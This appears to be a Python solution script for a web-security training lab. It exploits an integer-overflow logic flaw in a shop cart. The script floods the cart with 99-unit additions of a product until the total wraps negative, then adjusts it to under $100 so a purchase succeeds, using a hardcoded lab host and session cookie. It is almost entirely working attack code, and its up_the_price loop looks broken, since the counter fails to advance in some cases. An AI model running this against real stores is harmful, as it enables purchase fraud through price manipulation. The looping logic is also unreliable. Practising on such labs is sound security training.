import requests
import threading
from bs4 import BeautifulSoup

maxthreads = 20
sema = threading.Semaphore(value=maxthreads)
threads = []

main_url = "0a74005304d78ee381b97ff300df00a7.web-security-academy.net"
cookie = "q0FFTtYvfXhs7s0MjbYWGJhE6k9Y8SkV"
# prod_id and prod_price are related to different product choose from the vulnerable shop. Pick one which the highest lower than $100
prod_id = 8  # set up this to id of the product that costs lower than $100
prod_price = "92.76"  # set up to product cost


previous_price = 0


def check_price():
    url = f"https://{main_url}:443/cart"
    cookies = {"session": f"{cookie}"}
    headers = {"User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0",
               "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
               "Accept-Language": "pl,en-US;q=0.7,en;q=0.3",
               "Accept-Encoding": "gzip, deflate",
               "Referer": f"https://{main_url}/cart",
               "Upgrade-Insecure-Requests": "1",
               "Sec-Fetch-Dest": "document",
               "Sec-Fetch-Mode": "navigate",
               "Sec-Fetch-Site": "same-origin",
               "Sec-Fetch-User": "?1",
               "Te": "trailers"}
    r = requests.get(url, headers=headers, cookies=cookies)
    # am not sure if the return is valid
    # final_price = int(re.search('Total:</th>\n<th>(.+?)</th>', r.text).group(1).replace('$', '').strip()[:-3])
    final_price = get_price(r.text)
    print(f"Actual price: ${final_price}", end='\r')
    return final_price


def get_price(response):
    try:
        soup = BeautifulSoup(response, 'html.parser')
        return int(soup.find_all('table')[1].find_all('th')[1].get_text().replace('$', '')[0:-3])
    except Exception as ex:
        return 0


def add_item(quantity, prod_id):

    url = f"https://{main_url}:443/cart"
    cookies = {"session": f"{cookie}"}
    headers = {"User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0",
               "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
               "Accept-Language": "pl,en-US;q=0.7,en;q=0.3",
               "Accept-Encoding": "gzip, deflate",
               "Content-Type": "application/x-www-form-urlencoded",
               "Origin": f"https://{main_url}",
               "Referer": f"https://{main_url}/cart",
               "Upgrade-Insecure-Requests": "1",
               "Sec-Fetch-Dest": "document",
               "Sec-Fetch-Site": "same-origin",
               "Sec-Fetch-User": "?1",
               "Te": "trailers"}
    data = {"productId": f"{prod_id}",
            f"quantity": f"{quantity}",
            "redir": "CART"}
    requests.post(url, headers=headers, cookies=cookies, data=data)


def add_item_async(quantity, prod_id):
    sema.acquire()
    add_item(quantity, prod_id)
    check_price()
    sema.release()


def up_the_price(price):
    single_prod_price = float("92.76")
    prod_quantity = int(abs(price / single_prod_price))
    # print(price)
    # print(prod_quantity)
    # exit()
    i = 0
    while i < prod_quantity + 1:
        diff = prod_quantity + 1 - i
        if (diff >= 100):
            i = i + 99
            t = threading.Thread(target=add_item_async, args=(99, prod_id, ))
            t.start()
            threads.append(t)
            check_price()
            i = i + diff

    for t in threads:
        t.join()


quantity = 99

while True:
    new_price = check_price()
    if new_price < 0:
        print(f"Minus price {new_price}")
        break

    add_item(quantity, 1)

up_the_price(new_price)
new_price = check_price()

if new_price < 100 and new_price > 0:
    print(f"Now you can buy. Actual price: {new_price}")
else:
    print(f"Some error. Price: {new_price}")
